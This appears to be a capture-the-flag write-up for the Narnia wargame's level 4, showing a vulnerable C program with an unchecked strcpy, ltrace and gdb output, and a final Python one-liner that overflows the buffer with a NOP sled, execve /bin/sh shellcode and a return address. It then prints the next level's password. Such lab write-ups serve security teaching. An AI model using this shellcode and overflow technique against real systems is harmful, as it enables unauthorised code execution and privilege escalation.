@@ -1,0 +1,135 @@
+================ SOURCE =====================
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <ctype.h>
+
+extern char **environ;
+
+int main(int argc,char **argv){
+	int i;
+	char buffer[256];
+
+	for(i = 0; environ[i] != NULL; i++)
+		memset(environ[i], '\0', strlen(environ[i]));
+
+	if(argc>1)
+		strcpy(buffer,argv[1]);
+
+	return 0;
+}
+============= ANALYSIS =======================
+It appears that this is a buffer overflow, I'm not sure why that for loop is there :?
+Anyway, buffer is 256 bytes, lets start by trying to break it with 300.
+narnia4@narnia:~$ ltrace /narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+__libc_start_main(0x80484ad, 2, 0xffffd6a4, 0x8048550 <unfinished ...>
+strlen("TERM=xterm-256color")                                                                                                 = 19
+memset(0xffffd90a, '\0', 19)                                                                                                  = 0xffffd90a
+strlen("SHELL=/bin/bash")                                                                                                     = 15
+memset(0xffffd91e, '\0', 15)                                                                                                  = 0xffffd91e
+strlen("SSH_CLIENT=172.18.0.1 47875 22")                                                                                      = 30
+memset(0xffffd92e, '\0', 30)                                                                                                  = 0xffffd92e
+strlen("SSH_TTY=/dev/pts/0")                                                                                                  = 18
+memset(0xffffd94d, '\0', 18)                                                                                                  = 0xffffd94d
+strlen("LC_ALL=C")                                                                                                            = 8
+memset(0xffffd960, '\0', 8)                                                                                                   = 0xffffd960
+strlen("USER=narnia4")                                                                                                        = 12
+memset(0xffffd969, '\0', 12)                                                                                                  = 0xffffd969
+strlen("LS_COLORS=rs=0:di=01;34:ln=01;36"...)                                                                                 = 1312
+memset(0xffffd976, '\0', 1312)                                                                                                = 0xffffd976
+strlen("TMOUT=1800")                                                                                                          = 10
+memset(0xffffde97, '\0', 10)                                                                                                  = 0xffffde97
+strlen("MAIL=/var/mail/narnia4")                                                                                              = 22
+memset(0xffffdea2, '\0', 22)                                                                                                  = 0xffffdea2
+strlen("PATH=/usr/local/sbin:/usr/local/"...)                                                                                 = 93
+memset(0xffffdeb9, '\0', 93)                                                                                                  = 0xffffdeb9
+strlen("PWD=/home/narnia4")                                                                                                   = 17
+memset(0xffffdf17, '\0', 17)                                                                                                  = 0xffffdf17
+strlen("LANG=en_US.UTF-8")                                                                                                    = 16
+memset(0xffffdf29, '\0', 16)                                                                                                  = 0xffffdf29
+strlen("SHLVL=1")                                                                                                             = 7
+memset(0xffffdf3a, '\0', 7)                                                                                                   = 0xffffdf3a
+strlen("HOME=/home/narnia4")                                                                                                  = 18
+memset(0xffffdf42, '\0', 18)                                                                                                  = 0xffffdf42
+strlen("LOGNAME=narnia4")                                                                                                     = 15
+memset(0xffffdf55, '\0', 15)                                                                                                  = 0xffffdf55
+strlen("SSH_CONNECTION=172.18.0.1 47875 "...)                                                                                 = 46
+memset(0xffffdf65, '\0', 46)                                                                                                  = 0xffffdf65
+strlen("LESSOPEN=| /usr/bin/lesspipe %s")                                                                                     = 31
+memset(0xffffdf94, '\0', 31)                                                                                                  = 0xffffdf94
+strlen("LESSCLOSE=/usr/bin/lesspipe %s %"...)                                                                                 = 33
+memset(0xffffdfb4, '\0', 33)                                                                                                  = 0xffffdfb4
+strlen("_=/usr/bin/ltrace")                                                                                                   = 17
+memset(0xffffdfd6, '\0', 17)                                                                                                  = 0xffffdfd6
+strcpy(0xffffd4fc, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                     = 0xffffd4fc
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+Sure enough, the for loop is pointless. Let's figure out what location in the 300 bytes executes the next instruction.
+I used metasploit's pattern_create.rb to index the elements of the string, turns out that you only need 272 bytes and that's where the next instruction is executed.
+
+Using gdb we find the return address like so:
+(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
+Starting program: /narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+(gdb) x/200x $esp
+0xffffd620:	0x00000000	0xffffd6b4	0xffffd6c0	0xf7feacca
+0xffffd630:	0x00000002	0xffffd6b4	0xffffd654	0x080497cc
+0xffffd640:	0x0804825c	0xf7fcc000	0x00000000	0x00000000
+0xffffd650:	0x00000000	0xd4c6dab6	0xecffbea6	0x00000000
+0xffffd660:	0x00000000	0x00000000	0x00000002	0x080483b0
+0xffffd670:	0x00000000	0xf7ff04c0	0xf7e3c9e9	0xf7ffd000
+0xffffd680:	0x00000002	0x080483b0	0x00000000	0x080483d1
+0xffffd690:	0x080484ad	0x00000002	0xffffd6b4	0x08048550
+0xffffd6a0:	0x080485c0	0xf7feb160	0xffffd6ac	0x0000001c
+0xffffd6b0:	0x00000002	0xffffd7d3	0xffffd7e3	0x00000000
+0xffffd6c0:	0xffffd8f8	0xffffd908	0xffffd91c	0xffffd93b
+0xffffd6d0:	0xffffd94e	0xffffd957	0xffffd964	0xffffde85
+0xffffd6e0:	0xffffde90	0xffffde9c	0xffffdefa	0xffffdf11
+0xffffd6f0:	0xffffdf20	0xffffdf32	0xffffdf43	0xffffdf4c
+0xffffd700:	0xffffdf5f	0xffffdf67	0xffffdf77	0xffffdfa6
+0xffffd710:	0xffffdfc6	0x00000000	0x00000020	0xf7fdbbe0
+0xffffd720:	0x00000021	0xf7fdb000	0x00000010	0x178bfbff
+0xffffd730:	0x00000006	0x00001000	0x00000011	0x00000064
+0xffffd740:	0x00000003	0x08048034	0x00000004	0x00000020
+0xffffd750:	0x00000005	0x00000008	0x00000007	0xf7fdc000
+0xffffd760:	0x00000008	0x00000000	0x00000009	0x080483b0
+0xffffd770:	0x0000000b	0x000036b4	0x0000000c	0x000036b4
+0xffffd780:	0x0000000d	0x000036b4	0x0000000e	0x000036b4
+0xffffd790:	0x00000017	0x00000000	0x00000019	0xffffd7bb
+0xffffd7a0:	0x0000001f	0xffffdfe8	0x0000000f	0xffffd7cb
+0xffffd7b0:	0x00000000	0x00000000	0x6c000000	0x4da8e655
+0xffffd7c0:	0x7da495b5	0xf8eaeb65	0x698bc734	0x00363836
+0xffffd7d0:	0x2f000000	0x6e72616e	0x6e2f6169	0x696e7261
+0xffffd7e0:	0x41003461	0x41414141	0x41414141	0x41414141
+0xffffd7f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd800:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd810:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd820:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8f0:	0x43414141	0x00434343	0x00000000	0x00000000
+0xffffd900:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd910:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd920:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd930:	0x00000000	0x00000000	0x00000000	0x00000000
+
+Use python to print nopsled + payload + address in the nop sled (deep enough in this time; not like narnia2....)
+
+narnia4@narnia:~$ /narnia/narnia4 $( python -c'print "\x90"*(272-25)+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x15\xd8\xff\xff"')
+$ cat /etc/narnia_pass/narnia5
+faimahchiy
+
+Bam! easy peasy :) I used the same payload as for narnia2 btw
